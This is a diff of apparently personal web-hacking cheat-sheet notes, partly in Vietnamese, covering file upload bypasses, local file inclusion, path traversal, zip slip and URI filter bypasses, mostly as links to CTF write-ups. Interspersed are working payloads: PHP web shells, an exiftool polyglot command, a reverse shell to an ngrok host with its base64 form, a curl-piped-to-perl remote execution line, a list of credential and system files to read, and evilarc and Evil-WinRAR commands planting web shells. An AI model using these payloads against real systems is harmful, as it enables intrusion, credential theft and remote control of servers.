@@ -1,7 +1,7 @@
 -------------------------------------C#
 ProcessStartInfo startInfo = new ProcessStartInfo();
-startInfo.FileName = "cmd.exe";
-startInfo.Arguments = "/c systeminfo";
+startInfo.FileName = "c#md.exe";          ----------
+startInfo.Arguments = "/c sys#teminfo";    ------------
 startInfo.RedirectStandardOutput = true;
 startInfo.UseShellExecute = false;
 Process process = new Process();
@@ -14,8 +14,8 @@ https://viblo.asia/p/java-webshell-part-1-mot-vai-phuong-phap-tao-ra-jsp-webshel
 #---------------------------------------------
 https://viblo.asia/p/file-upload-vulnerabilities-cac-lo-hong-upload-tep-tin-phan-3-WR5JRDndVGv
 /a.png/b.php phát hiện file b.php không tồn tại sẽ xử lý file a.png nhu file php
-<?php system($_GET['cmd']);?>
-<?php`$_GET[0]`?>
+<?php system($_G#ET['cm#d']);?>
+<?php`$_G#ET[0#]`?>
 concat/group_concat(0x3c,'?php ',' phpinfo(); ?',0x3e)
 abc.php.php
 test.php%00.png , test.php\x00.png
@@ -24,7 +24,11 @@ chạy các file cùng đuôi khác phar,phtml,...pht,inc
 change file type
 change file signature
 PYTHON save file by command 
-exiftool -Comment="<?php system($_GET['cmd']);?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
+exiftool -Comment="<?php syst#em($_GET['cm#d']);?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
+---------------------------------inject code into image
+https://hackmd.io/@endy/B1zOJfSTh
+https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html
+
 
 if web shell is an image, find the include to include that's is image will trigger php code
 https://aidanstansfield.github.io/2020/05/15/sharkyctf-penteeeeest.html#exploiting-png-upload
@@ -36,6 +40,14 @@ by change user-agent; referer   requestline
 https://laxiisteam.blogspot.com/2023/09/patriotctf-va-spycio.html
 sh -i >& /duv/tcp/0.tcp.ap.ngrok.io/10816 0>&1 
 c2ggLWkgPiYgL2R1di90Y3AvMC50Y3AuYXAubmdyb2suaW8vMTA4MTYgMD4mMQ==
+--------------------------------------multi upload -> vul
+https://hackmd.io/@taidh/Ska30dw0c
+https://hackmd.io/@CP04042K/SJBWkLxMn
+-----------------------------------upload and run js code -> XSS
+https://hackmd.io/@CP04042K/ryyqJeXx2#SpyBug   #upload sound file and run js code -> XSS
+//RIFF????WAVE    #RIFF wav file
+multer của nodejs nó chỉ check xem nếu tồn tại dãy bytes RIFF????WAVE trong nội dung là nó quy thành file audio luôn
+https://hackmd.io/@CP04042K/SJBWkLxMn
 ----------------------------------------------------race condition
 https://nguyendt.hashnode.dev/crewctf-2022
 https://github.com/DoQuangPhu/CTF_writeups/tree/main/BKCTF/Web/web-metadata_checker
@@ -46,6 +58,23 @@ https://github.com/huntergregal/PNG-IDAT-Payload-Generator/
 /proc/   chứa info process đang chạy
 /proc/self/environ     là file symlink ảo trỏ tới thư mục của process hiện tại ( process đang excec)
 ----------------------------------------------------------------------path traversal
+
+----------------------------------------get info
+https://www.4rth4s.xyz/2020/12/learning-all-about-lfi-local-file.html
+/etc/issue (A message or system identification to be printed before the login prompt.)
+/etc/motd (Message of the day banner content. Can contain information about the system owners or use of the system.)
+/etc/passwd 
+/etc/group 
+/etc/resolv.conf (might be better than /etc/passwd for triggering IDS sigs)
+/etc/shadow
+/home/[USERNAME]/.bash_history or .profile
+~/.bash_history or .profile
+$USER/.bash_history or .profile
+/root/.bash_history or .profile
+/etc/mtab  
+/etc/inetd.conf  
+/var/log/dmessage
+public and private key
 --------------------------------------LFI--->RCE
 https://hackmd.io/@endy/rkcs_lYF2#Magic-Login-Harder
 https://viblo.asia/p/php-magic-ctf-writeups-gwd43kpK4X9
@@ -55,7 +84,6 @@ https://hackmd.io/@endy/Skxms9eW2
 https://github.com/synacktiv/php_filter_chain_generator
 https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT
 --------------------------------------------------
-
 encode 1 or 2 url
 ..../..../..../
 ...//...//
@@ -72,8 +100,14 @@ misconfig of nginx:  location /img{ }
 -------------URI
 localhost:1111/read.php?file=file:///etc/passwd
 php://filter/convert.base64-encode/resource=/etc/passwd
-https://www.kiso.vn/directory-traversal-vulnerabilities-phan-4.html
+https://blog.efiens.com/post/doublevkay/ptitctf2020-writeups/
+?q=php://filter/convert.iconv.utf-16le.utf-8/resource=index.php
 
+https://hackmd.io/@Chivato/rkj-Y1GVI#COMPARE-THE-PAIR
+#include file in limited length
+https://bugs.php.net/bug.php?id=53465
+/dev/fd/<descriptor>
+https://hackmd.io/@CP04042K/BkFYA8P0j     #werkzeug RCE
 --------------------------------------------------------------------URI bypass filter
 https://ctf.rip/asis-ctf-2016-binarycloud-web-challenge/
 <?php
@@ -87,10 +121,22 @@ $uri = "//upload?/home/binarycloud/";
 $data = parse_url($uri);
 print_r($data);
 ?>
-----------------------------------------------------------------------
-untrusted data  rơi vào những hàm xử lý đường dẫn
-impact: thao túng file path
+---------------------------------------------------------------misconfig
+https://www.youtube.com/watch?v=XG14EstTgQ4
+/..;/manager/html       tomcat:tomcat
+https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
+http://127.0.0.1/static../settings.py
 
+http://tomcat/index.cfm/..;/x   bypass 403  nginx
+Log injection -> RCE
+curl https://login.getbynder.com/..;/railo-context/foo.cfm -d 'SHELL=-c "curl orange.tw/bc.pl | perl -"'
+/login;/..;/admin
+-----------------------------------------------------------------
+https://www.4rth4s.xyz/2020/06/root-me-local-file-inclusion-wrappers.html
+php?page=expect://ls   (unfortunately the expect PHP module is not enabled by default)
+/proc/self/environ 
+File upload + LFI vulnerability + PHP Wrapper => Use zip:// wrapper !
+------------------------------------------------------zip slip
 python evilarc.py -d 2 -o unix hack.txt
 python evilarc.py -o unix -f exploit.zip sess_ -p var/lib/php/sessions
 ln -s originfile  newfile
@@ -98,6 +144,11 @@ zip -r --symlinks demo.zip symlinkfile
 zip -y demo.zip symlinkfile 
 
 https://github.com/capture0x/LFI-FINDER   #tool find LFI
+-----------------------------------------------
+https://0xdf.gitlab.io/2020/02/01/htb-re.html
+https://research.checkpoint.com/2019/extracting-code-execution-from-winrar/
+https://github.com/manulqwerty/Evil-WinRAR-Gen      #when extract to full path
+python3 /opt/Evil-WinRAR-Gen/evilWinRAR.py -o webshell.ace -e shell.aspx -g test.txt -p 'c:\inetpub\wwwroot\re\'
 #-------------------------------------------------
 https://viblo.asia/p/directory-traversal-vulnerabilities-cac-lo-hong-directory-traversal-path-traversal-phan-5-EvbLbkY1Vnk
 Luôn thực hiện input validation: Kiểm tra đồng thời tên file, content-type, header, file size mỗi khi thực hiện kiểm tra các file upload
